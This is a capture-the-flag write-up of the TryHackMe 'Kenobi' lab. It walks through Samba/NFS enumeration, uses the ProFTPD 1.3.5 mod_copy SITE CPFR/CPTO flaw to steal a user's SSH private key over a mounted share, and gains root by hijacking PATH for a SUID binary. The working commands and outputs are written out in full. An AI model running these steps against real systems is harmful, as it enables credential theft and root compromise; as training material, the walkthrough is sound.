# Kenobi Write-Up

    BOX IP Addresses:
    10.10.208.85
    

## [Task 1] Deploy the vulnerable machine

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

### 1 Make sure you're connected to our network and deploy the machine
Done :)

### 2 Scan the machine with nmap, how many ports are open?

    nmap -sV -sC -oA nmap 10.10.208.85

    Nmap scan report for 10.10.208.85
    Host is up (0.12s latency).
    Not shown: 993 closed ports
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         ProFTPD 1.3.5
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
    |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
    |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 1 disallowed entry
    |_/admin.html
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp  open  rpcbind     2-4 (RPC #100000)
    | rpcinfo:
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  2,3,4       2049/tcp   nfs
    |   100003  2,3,4       2049/tcp6  nfs
    |   100003  2,3,4       2049/udp   nfs
    |   100003  2,3,4       2049/udp6  nfs
    |   100005  1,2,3      46674/udp6  mountd
    |   100005  1,2,3      52495/udp   mountd
    |   100005  1,2,3      57753/tcp   mountd
    |   100005  1,2,3      59797/tcp6  mountd
    |   100021  1,3,4      37488/udp   nlockmgr
    |   100021  1,3,4      42735/tcp6  nlockmgr
    |   100021  1,3,4      45671/tcp   nlockmgr
    |   100021  1,3,4      59713/udp6  nlockmgr
    |   100227  2,3         2049/tcp   nfs_acl
    |   100227  2,3         2049/tcp6  nfs_acl
    |   100227  2,3         2049/udp   nfs_acl
    |_  100227  2,3         2049/udp6  nfs_acl
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    2049/tcp open  nfs_acl     2-3 (RPC #100227)
    Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
    |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: kenobi
    |   NetBIOS computer name: KENOBI\x00
    |   Domain name: \x00
    |   FQDN: kenobi
    |_  System time: 2020-07-24T23:51:50-05:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2020-07-25T04:51:50
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 28.08 seconds
    03  2,3,4       2049/tcp   nfs
        |   100003  2,3,4       2049/tcp6  nfs
        |   100003  2,3,4       2049/udp   nfs
        |   100003  2,3,4       2049/udp6  nfs
        |   100005  1,2,3      46674/udp6  mountd
        |   100005  1,2,3      52495/udp   mountd
        |   100005  1,2,3      57753/tcp   mountd
        |   100005  1,2,3      59797/tcp6  mountd
        |   100021  1,3,4      37488/udp   nlockmgr
        |   100021  1,3,4      42735/tcp6  nlockmgr
        |   100021  1,3,4      45671/tcp   nlockmgr
        |   100021  1,3,4      59713/udp6  nlockmgr
        |   100227  2,3         2049/tcp   nfs_acl
        |   100227  2,3         2049/tcp6  nfs_acl
        |   100227  2,3         2049/udp   nfs_acl
        |_  100227  2,3         2049/udp6  nfs_acl
        139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
        2049/tcp open  nfs_acl     2-3 (RPC #100227)
        Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

        Host script results:
        |_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
        |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
        | smb-os-discovery:
        |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
        |   Computer name: kenobi
        |   NetBIOS computer name: KENOBI\x00
        |   Domain name: \x00
        |   FQDN: kenobi
        |_  System time: 2020-07-24T23:51:50-05:00
        | smb-security-mode:
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        | smb2-security-mode:
        |   2.02:
        |_    Message signing enabled but not required
        | smb2-time:
        |   date: 2020-07-25T04:51:50
        |_  start_date: N/A

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 28.08 seconds


We can see 7 ports open.


## [Task 2] Enumerating Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

### 1 	

*Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.208.85

SMB has two ports, 445 and 139.

Using the nmap command above, how many shares have been found?*
----

I believe that smb-enum-users.nse doesn't work for my version of nmap. Here is the output for the above:

    ┌─[user@parrot]─[~/labs/tryhackme/kenobi]
    └──╼ $nmap -p 445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.208.85
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 06:03 BST
    Nmap scan report for 10.10.208.85
    Host is up (0.12s latency).

    PORT    STATE SERVICE
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Host script results:
    | smb-enum-shares:
    |   account_used: guest
    |   \\10.10.208.85\IPC$:
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.208.85\anonymous:
    |     Type: STYPE_DISKTREE
    |     Comment:
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\kenobi\share
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.208.85\print$:
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>
    |_ smb-enum-users: ERROR: Script execution failed (use -d to debug)

    Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds

3 shares have been found.

### 2

*On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

smbclient //<ip>/anonymous

Using your machine, connect to the machines network share.

Once you're connected, list the files on the share. What is the file can you see?*
----

    ┌─[user@parrot]─[~/labs/tryhackme/kenobi]
    └──╼ $smbclient //10.10.208.85/anonymous
    Enter WORKGROUP\user's password:
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D        0  Wed Sep  4 11:49:09 2019
      ..                                  D        0  Wed Sep  4 11:56:07 2019
      log.txt                             N    12237  Wed Sep  4 11:49:09 2019

    		9204224 blocks of size 1024. 6877108 blocks available

We can see a log.txt file.

### 3

*You can recursively download the SMB share too. Submit the username and password as nothing.

smbget -R smb://<ip>/anonymous

Open the file on the share. There is a few interesting things found.

   Information generated for Kenobi when generating an SSH key for the user
   Information about the ProFTPD server.

What port is FTP running on?*
----

    ┌─[✗]─[user@parrot]─[~/labs/tryhackme/kenobi]
    └──╼ $smbget -R smb://10.10.208.85/anonymous
    Password for [user] connecting to //anonymous/10.10.208.85:
    Using workgroup WORKGROUP, user user
    smb://10.10.208.85/anonymous/log.txt                                            
    Downloaded 11.95kB in 3 seconds

Read the log.txt file [here](/logs.txt), we can see:


    # Port 21 is the standard FTP port.
    Port				21


### 4 	

*Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.208.85

What mount can we see?*

    ┌─[user@parrot]─[~/labs/tryhackme/kenobi]
    └──╼ $nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.208.85
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 06:22 BST
    Nmap scan report for 10.10.208.85
    Host is up (0.12s latency).

    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-showmount:
    |_  /var *

WE can see the only mount is `/var`.

## [Task 3] Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

### 1 Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

1.3.5.

### 2 We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running?

    ┌─[✗]─[user@parrot]─[~/gitclones]
    └──╼ $searchsploit proftpd 1.3.5
    ------------------------------------------------------------ ---------------------------------
    Exploit Title                                              |  Path
    ------------------------------------------------------------ ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)   | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution         | linux/remote/36803.py
    ProFTPd 1.3.5 - File Copy                                   | linux/remote/36742.txt
    ------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results

There are 3.

### 3

*You should have found an exploit from ProFtpd's mod_copy module. The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.*

*We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.*

    ┌─[user@parrot]─[~/gitclones]
    └──╼ $nc 10.10.111.100 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.111.100]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful

Then had to install nfs-commons since it wasn't installed:
    sudo apt-get install nfs-commons

    ┌─[user@parrot]─[~/gitclones]
    └──╼ $sudo mount 10.10.111.100:/var /mnt/kenobiNFS

### 4 	

*We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.*


#5 	

*Lets mount the /var/tmp directory to our machine*

    mkdir /mnt/kenobiNFS
    mount machine_ip:/var /mnt/kenobiNFS
    ls -la /mnt/kenobiNFS

*We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.*

*What is Kenobi's user flag (/home/kenobi/user.txt)?*

We copied the id_rsa to /var/tmp, so now we're going to copy it into our kenobi folder, and change the file permissions to 600.

    cp /mnt/kenobiNFS/tmp/id_rsa .
    chmod 600 id_rsa
    ssh kenobi@10.10.111.100 -i id_rsa

and we have a shell!

    kenobi@kenobi:~$ cat user.txt
    d0b0f3f53b6caa532a83915e19224899

## [Task 4] Privilege Escalation with Path Variable Manipulation 

Lets first understand what what SUID, SGID and Sticky Bits are.
| Permission | On Files                                                       | On Directories                                            |
|------------|----------------------------------------------------------------|-----------------------------------------------------------|
| SUID Bit   | User executes the file with permissions of the file owner      | -                                                         |
| SGID Bit   | User executes the file with the permission of the group owner. | File created in directory gets the same group owner.      |
| Sticky Bit | No meaning                                                     | Users are prevented from deleting files from other users. |

### 1 	

*SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.*

*To search the a system for these type of files run the following:* 

    find / -perm -u=s -type f 2>/dev/null

*What file looks particularly out of the ordinary?*

    kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
    /sbin/mount.nfs
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/bin/chfn
    /usr/bin/newgidmap
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /usr/bin/menu
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/newgrp
    /bin/umount
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6

We can see /usr/bin/menu here that looks interesting.

### 2 	

Run the binary, how many options appear?

    kenobi@kenobi:/tmp$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :

3 options appear.

### 3 	

Strings is a command on Linux that looks for human readable strings on a binary.

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
#4 	

What is the root flag (/root/root.txt)?


    kenobi@kenobi:~$ strings /usr/bin/menu
    /lib64/ld-linux-x86-64.so.2
    libc.so.6
    setuid
    __isoc99_scanf
    puts
    __stack_chk_fail
    printf
    system
    __libc_start_main
    __gmon_start__
    GLIBC_2.7
    GLIBC_2.4
    GLIBC_2.2.5
    UH-`
    AWAVA
    AUATL
    []A\A]A^A_
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :
    curl -I localhost
    uname -r
    ifconfig
    Invalid choice
    ;*3$"
    GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
    crtstuff.c
    __JCR_LIST__
    deregister_tm_clones
    __do_global_dtors_aux
    completed.7594
    __do_global_dtors_aux_fini_array_entry
    frame_dummy
    __frame_dummy_init_array_entry
    menu.c
    __FRAME_END__
    __JCR_END__
    __init_array_end
    _DYNAMIC
    __init_array_start
    __GNU_EH_FRAME_HDR
    _GLOBAL_OFFSET_TABLE_
    __libc_csu_fini
    _ITM_deregisterTMCloneTable
    puts@@GLIBC_2.2.5
    _edata
    __stack_chk_fail@@GLIBC_2.4
    system@@GLIBC_2.2.5
    printf@@GLIBC_2.2.5
    __libc_start_main@@GLIBC_2.2.5
    __data_start
    __gmon_start__
    __dso_handle
    _IO_stdin_used
    __libc_csu_init
    __bss_start
    main
    _Jv_RegisterClasses
    __isoc99_scanf@@GLIBC_2.7
    __TMC_END__
    _ITM_registerTMCloneTable
    setuid@@GLIBC_2.2.5
    .symtab
    .strtab
    .shstrtab
    .interp
    .note.ABI-tag
    .note.gnu.build-id
    .gnu.hash
    .dynsym
    .dynstr
    .gnu.version
    .gnu.version_r
    .rela.dyn
    .rela.plt
    .init
    .plt.got
    .text
    .fini
    .rodata
    .eh_frame_hdr
    .eh_frame
    .init_array
    .fini_array
    .jcr
    .dynamic
    .got.plt
    .data
    .bss
    .comment

    kenobi@kenobi:/tmp$ echo /bin/bash > curl
    kenobi@kenobi:/tmp$ cat curl
    /bin/bash
    kenobi@kenobi:/tmp$ chmod 777 curl
    kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
    kenobi@kenobi:/tmp$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :1
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    root@kenobi:/tmp#

I decided to do it with bash instead of sh like the notes, and it still worked!

    root@kenobi:/tmp# cat /root/root.txt 
    177b3cd8562289f37382721c28381f02

and found the flag. Completed!
